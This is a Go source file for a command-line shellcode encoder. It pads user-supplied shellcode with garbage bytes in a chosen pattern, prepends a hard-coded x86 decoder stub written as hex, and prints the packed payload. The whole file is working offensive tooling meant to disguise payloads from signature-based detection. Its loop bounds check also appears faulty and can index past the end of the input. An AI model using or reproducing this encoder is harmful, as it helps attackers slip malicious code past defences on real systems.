/*
# Copyright (c) 2019, Gouasmia Zakaria
# All rights reserved.

*/
package main

import (
    "os"
    "fmt"
    "flag"
    "bytes"
    "encoding/hex"
)


func fatal(msg string) {
    fmt.Println(msg)
    os.Exit(1)
}


func decode(s string) []byte {
    h, err := hex.DecodeString(s)

    if err != nil {
        fatal(fmt.Sprintf("Could not decode hex string: %s", err.Error()))
    }

    return h
}


func main () {
    var g string
    var p string
    var e string
    var s string

    flag.StringVar(&g, "g", "2f", "Garbage byte")
    flag.StringVar(&p, "p", "xb", "Insertion pattern x is garbage byte, b is real byte.")
    flag.StringVar(&e, "e", "f1f1", "Bytes to signal end of encoding")
    flag.StringVar(&s, "s", "0000", "Shellcode to be encode.")

    flag.Parse()

    gb := decode(g)
    eb := decode(e)
    sb := decode(s)

    if bytes.Contains(sb, gb) {
        fatal("Shellcode contains the garbage byte. Choose another.")
    }
    if bytes.Contains(sb, eb) {
        fatal("Shellcode contains end pattern. Choose another.")
    }

    var enc []byte

    // Add the decoder routine to our payload
    enc = append(enc, decode("eb1a5e8d3e31c98b1c0e416681fb")...)
    enc = append(enc, eb...)
    enc = append(enc, decode("740f80fb")...)
    enc = append(enc, gb...)
    enc = append(enc, decode("74f0881f47ebebe8e1ffffff")...)

    // Encode our shellcode and add it to the payload
    for i := 0; i < len(sb); i++ {
        for j := 0; j < len(p); j++ {
            if p[j] == 'x' {
                enc = append(enc, gb...)
            } else if p[j] == 'b' {
                enc = append(enc, sb[i])
                i++
            } else {
                // Ignore any unnecessary characters in the pattern.
            }

            if i > len(sb) {
                break
            }
        }

        // If we've reached the end of our pattern i will get incremented by
        // the for loop. Decrement it first so it ends up where we left off.
        i--
    }

    // Add our end byte to the payload.
    enc = append(enc, eb...)

    // Print the final payload
    fmt.Println("[+] Encoded shellcode with decoder:")
    for _, v := range enc {
        fmt.Printf("\\x%02x", v)
    }
    fmt.Println()
}
